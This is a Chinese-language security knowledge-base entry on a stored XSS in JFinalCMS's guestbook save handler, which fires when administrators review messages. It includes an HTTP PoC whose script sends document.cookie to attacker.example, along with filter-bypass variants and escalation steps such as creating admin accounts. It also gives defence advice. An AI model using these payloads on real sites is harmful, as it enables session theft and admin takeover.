---
id: web-generic-xss-jfinalcms-guestbook-getmodel-stored-admin-review
title: JFinalCMS 前台留言 getModel 未过滤存储，后台审核时触发存储型 XSS
type: scenario
domain: web
path: web/generic/xss
technique: jfinalcms-guestbook-getmodel-stored-xss
tags:
- web
- java
- jfinalcms
- jrecms
- xss
- stored
- getmodel
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:44:59+08:00'
  notes: 已对照原文 0x02 与图04-07 核对：GuestbookController.save 用 getModel(Guestbook.class) 绑定表单（含 content=<script>alert(1);</script>）未过滤，Model.save 生成 insert into cms_guestbook 原样入库（图06 调试 SQL）；留言 status=0 待后台审核，图07 为后台审核上下文，管理员查看时触发存储型 XSS。PoC 的 captcha 参数与代码 validateCaptcha 一致。affected_versions 原文未声明。未在本机复跑。
url: /docs/web/generic/xss/web-generic-xss-jfinalcms-guestbook-getmodel-stored-admin-review/
draft: false
kb_aliases:
- JFinalCMS 留言存储 XSS
- GuestbookController getModel XSS
- 后台审核 XSS
- JreCms 存储型 XSS
---

## 一句话结论

JFinalCMS 前台留言接口 `GuestbookController.save` 用 JFinal 的 `getModel(Guestbook.class)` 把表单字段（含 `content`）原样绑定到实体并 `save()` 入库，未做任何 HTML 过滤；管理员在后台审核/查看留言时，模板未转义地渲染该内容，`<script>alert(1)</script>` 即在管理员会话中执行，形成面向后台的存储型 XSS。

## 原理

- **入口**：前台 `/guestbook` 留言表单提交到 `GuestbookController.save`；代码 `Guestbook guestbook = getModel(Guestbook.class, "", true); guestbook.setStatus(0); guestbook.save();`——`getModel` 按字段名自动绑定请求参数，`skipConvertError=true` 容错，完全没有 HTML 编码/白名单。
- **存储**：`Model.save()` 生成 `insert into cms_guestbook(..., content, ...) values(..., '<script>alert(1)</script>', ...)`，原文调试栈可见 `content` 原样进入 SQL 参数。
- **触发**：留言默认 `status=0` 待审核；管理员进入后台留言管理/审核列表时，页面把 `content` 渲染为 HTML（后台模板未转义），脚本在管理员浏览器执行。
- **为什么危害高**：XSS 发生在后台管理员上下文，可读取管理页面数据、以管理员身份发起 CSRF、创建管理员账号或投递后台 RCE 链；前台任意访客都能写入，攻击面大。
- **验证要点**：提交含 `<script>` 的留言，确认数据库中内容原样保存；管理员打开审核页面观察弹窗/请求。

## 触发条件

- 前台留言功能开放且无需登录（或可自助注册）。
- `save` 使用 `getModel`/自动绑定且未做 HTML 过滤、长度/内容校验。
- 后台审核/展示页面未对留言内容做 HTML 转义。
- 管理员会查看待审核留言（社工或等待）。

## 利用步骤

1. 打开前台留言页，填写联系人/手机等必填项，内容填 `<script>alert(document.domain)</script>` 或更隐蔽的 `fetch('https://attacker/?c='+document.cookie)`。
2. 提交后确认留言进入待审核状态（前台可能提示成功）。
3. 等待/诱导管理员在后台打开留言审核列表；脚本在管理员浏览器执行。
4. 可升级为：读取后台页面 token、以管理员身份调用用户管理接口创建账号、或加载外部攻击脚本。
5. 验证：管理员侧弹窗或攻击者服务器收到请求；数据库中 `content` 保留原始脚本。

## PoC

```http
POST /guestbook/save HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

contact=attacker&mobile=18888888888&content=%3Cscript%3Efetch(%22https%3A%2F%2Fattacker.example%2F%3Fc%3D%22%2Bdocument.cookie)%3C%2Fscript%3E&captcha=<valid>
```

## 变体与关联

- [[web-generic-xss-jfinalcms-login-enjoy-getpara-reflected]]：同产品登录页反射型 XSS（请求参数回显）。
- [[web-generic-xss-jfinalcms-profile-realname-beetl-unescaped-default]]：同产品 Beetl 未转义导致的存储型 XSS。
- [[web-generic-xss-backend-script-style-blacklist-api-bypass]]：后台过滤器黑名单绕过的通用思路。
- 变体：绕过简单关键字过滤可用 `<img src=x onerror=...>`、大小写/编码、SVG；留言审核列表与详情页可能有不同输出点。
- 边界：后台模板启用转义、留言内容被富文本过滤器清洗、管理员从不查看时链断（可配合其它触发点）。

## 检测与防御

- 检测：留言内容入库前未编码；后台页面渲染 `content` 时未转义；请求体含 `<script`/`onerror` 等。
- 防御：入库前做 HTML 清洗（白名单富文本）或输出时按上下文转义；对留言做长度/频率限制与验证码；后台管理页设置严格 CSP；管理员 Session 加 `HttpOnly` 并避免在后台页面渲染不可信 HTML。
- 响应：排查含脚本的历史留言与管理员访问记录，评估是否已创建异常账号或执行敏感操作。
